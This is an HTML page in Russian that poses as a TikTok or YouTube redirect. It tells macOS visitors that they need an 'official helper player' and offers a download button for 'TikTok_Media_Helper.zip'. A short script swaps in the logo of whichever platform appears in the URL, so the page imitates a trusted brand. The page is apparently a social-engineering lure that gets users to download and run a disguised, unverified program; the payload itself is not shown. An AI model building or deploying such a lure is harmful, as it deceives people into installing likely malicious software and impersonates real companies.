<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Переход по ссылке...</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; }
        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; transition: 0.3s; }
        .btn:hover { transform: scale(1.05); background: #ef2950; }
        .footer { margin-top: 20px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="card">
        <div id="icon">🎬</div>
        <h2>Переход к контенту...</h2>
        <p id="status">Для стабильного просмотра видео на macOS необходимо использовать официальный плеер-помощник.</p>
        <div class="loader"></div>
        <a href="TikTok_Media_Helper.zip" class="btn">ОТКРЫТЬ В ПРИЛОЖЕНИИ</a>
        <div class="footer">Версия для macOS 10.13 и выше</div>
    </div>

    <script>
        // Простая логика смены иконки в зависимости от ссылки
        const urlParams = new URLSearchParams(window.location.search);
        if(window.location.href.includes('tiktok')) {
            document.getElementById('icon').innerHTML = '<img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-png.png" width="50">';
        } else if(window.location.href.includes('youtube')) {
            document.getElementById('icon').innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" width="80">';
        }
    </script>
</body>
</html>
